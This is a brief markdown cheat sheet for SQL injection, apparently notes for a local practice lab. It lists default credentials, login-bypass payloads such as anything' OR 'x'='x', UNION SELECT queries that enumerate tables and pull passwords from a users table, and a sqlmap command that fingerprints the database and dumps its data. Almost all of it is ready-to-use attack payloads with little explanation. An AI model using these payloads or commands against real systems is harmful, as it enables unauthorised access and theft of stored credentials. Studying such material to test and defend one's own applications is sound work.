# SQL Injection

[SQL Injection Cheat Sheet][4]

## Login
[Reference][1]

  * admin:password
  * user:123

```
anything' OR 'x'='x'
anything' OR 1='1
```

## Read
[Reference][3]

Test for injection
```
read.php?id=1 OR 1=1
```

Find the correct number of columns
```
read.php?id=1 ORDER BY 1....
```

Find table names
```
read.php?id=1 UNION SELECT TABLE_NAME,2 FROM information_schema.tables
```

Query the data
```
read.php?id=1 UNION SELECT id,password from users
```

### SqlMap
[Reference][2]
```
python sqlmap.py -u http://localhost:5100/sqli/read.php?id=1 -f --banner --dbs --users --dump
```

[1]: http://www.unixwiz.net/techtips/sql-injection.html
[2]: https://github.com/sqlmapproject/sqlmap/wiki/Usage
[3]: http://www.sqlinjection.net/union/
[4]: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
